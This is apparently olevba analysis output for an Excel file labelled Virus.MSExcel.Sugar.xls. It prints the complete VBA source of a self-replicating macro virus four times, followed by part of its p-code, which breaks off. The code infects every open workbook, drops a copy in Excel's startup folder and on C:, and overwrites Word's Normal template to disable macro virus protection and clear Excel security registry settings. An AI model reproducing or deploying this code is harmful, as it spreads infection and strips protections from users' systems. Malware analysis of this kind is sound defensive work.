olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Sugar.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Sugar.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Sugar.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Sugar.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Sugar.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Sugar.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 7947 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	EndWith 
' Line #11:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld vbCr 
' 	St v1 
' Line #17:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #18:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #19:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #20:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #25:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Label out 
' Line #30:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #31:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (True)
' 	St run1 
' Line #33:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #37:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
